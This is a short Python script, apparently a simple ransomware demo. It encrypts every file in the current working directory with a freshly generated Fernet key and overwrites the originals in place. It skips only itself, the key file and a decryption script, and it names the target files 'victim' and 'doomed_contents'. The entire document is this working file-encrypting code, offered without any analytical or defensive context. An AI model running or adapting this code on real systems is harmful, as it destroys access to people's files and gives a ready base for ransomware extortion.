# ./venv/bin/python3

from os import listdir
from os.path import isfile
from cryptography.fernet import Fernet


def file_encyption() -> None:
    """ Encrypt files given secret key. """
    files = []
    ignored_files = ['file_encryption.py', 'key.key', 'file_decryption.py']
    for file in listdir():
        if file in ignored_files:
            continue
        if isfile(file):
            files.append(file)

    key = Fernet.generate_key()
    with open('key.key', 'wb') as file_write:
        file_write.write(key)

    for victim in files:
        with open(victim, 'rb') as file_read:
            doomed_contents = file_read.read()
        encrypted_contents = Fernet(key).encrypt(doomed_contents)
        with open(victim, 'wb') as file_writer:
            file_writer.write(encrypted_contents)


if __name__ == '__main__':
    file_encyption()
